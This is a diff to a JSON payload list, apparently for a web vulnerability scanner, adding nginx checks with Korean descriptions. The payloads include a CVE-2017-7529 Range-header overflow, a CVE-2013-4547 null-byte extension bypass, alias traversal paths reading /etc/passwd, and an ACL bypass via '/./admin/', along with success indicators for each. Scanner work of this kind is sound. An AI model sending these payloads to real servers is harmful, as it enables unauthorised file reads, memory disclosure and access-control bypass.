@@ -5034,6 +5034,86 @@
           }
         },
         {
+          "id": "cve_2017_7529_nginx_range",
+          "name": "CVE-2017-7529 Nginx Range 필터 정수 오버플로우 (메모리 정보 누출)",
+          "payload": "bytes=-17208,-9223372036854743296",
+          "description": "Range 헤더 정수 오버플로우로 캐시 헤더/메모리 일부가 노출될 수 있음. 206 응답 + 비정상 Content-Range(음수/거대값) 면 취약. 영향: nginx 0.5.6~1.13.2.",
+          "risk": "high",
+          "cve": "CVE-2017-7529",
+          "location": "header",
+          "param": "Range",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2017-7529",
+          "applies_to": {
+            "server": [
+              "nginx"
+            ]
+          }
+        },
+        {
+          "id": "cve_2013_4547_nginx_uri_space",
+          "name": "CVE-2013-4547 Nginx URI 공백/널바이트 제한·확장자 우회",
+          "payload": "/uploads/shell.php%20%00.gif",
+          "description": "URI 내 공백+널바이트(%20%00)로 확장자/접근 제한 우회 → 정적 파일로 위장해 PHP 등 실행. 영향: nginx 0.8.41~1.5.6.",
+          "risk": "high",
+          "cve": "CVE-2013-4547",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2013-4547",
+          "applies_to": {
+            "server": [
+              "nginx"
+            ]
+          }
+        },
+        {
+          "id": "nginx_alias_traversal_static",
+          "name": "Nginx alias off-by-slash 경로 이탈 (오설정 · /static)",
+          "payload": "/static../../../../../../etc/passwd",
+          "description": "location /static { alias ...; } 에 후행 슬래시가 없으면 /static../ 로 상위 경로 이탈(LFI). 응답에 root:x:0:0 이면 성공. 실제 프리픽스(/static·/assets·/media 등)에 맞게 조정.",
+          "risk": "high",
+          "cve": "",
+          "location": "path",
+          "param": "",
+          "reference": "https://labs.hakaioffsec.com/nginx-alias-traversal/",
+          "applies_to": {
+            "server": [
+              "nginx"
+            ]
+          }
+        },
+        {
+          "id": "nginx_alias_traversal_assets",
+          "name": "Nginx alias off-by-slash 경로 이탈 (오설정 · /assets)",
+          "payload": "/assets../../../../../../etc/passwd",
+          "description": "alias 후행 슬래시 누락 오설정을 /assets 프리픽스로 점검. 응답에 root:x:0:0 이면 경로 이탈 성공.",
+          "risk": "high",
+          "cve": "",
+          "location": "path",
+          "param": "",
+          "reference": "https://labs.hakaioffsec.com/nginx-alias-traversal/",
+          "applies_to": {
+            "server": [
+              "nginx"
+            ]
+          }
+        },
+        {
+          "id": "nginx_merge_slashes_acl_bypass",
+          "name": "Nginx 경로 정규화 ACL 우회 (//, /./)",
+          "payload": "/./admin/",
+          "description": "merge_slashes off 등으로 //admin·/./admin 이 다르게 처리되면 상위 ACL 우회 가능. 보호 경로가 403 대신 200 이면 우회 성공(경로는 대상에 맞게 조정).",
+          "risk": "medium",
+          "cve": "",
+          "location": "path",
+          "param": "",
+          "reference": "https://portswigger.net/web-security/request-smuggling/advanced#url-path-normalization",
+          "applies_to": {
+            "server": [
+              "nginx"
+            ]
+          }
+        },
+        {
           "id": "nuclei_cve_2026_19478",
           "name": "CVE-2026-19478 GitLab CE/EE - GraphQL @gl_introduced Arbitrary Method Invocation",
           "payload": "/api/v4/projects?visibility=public&per_page=1",
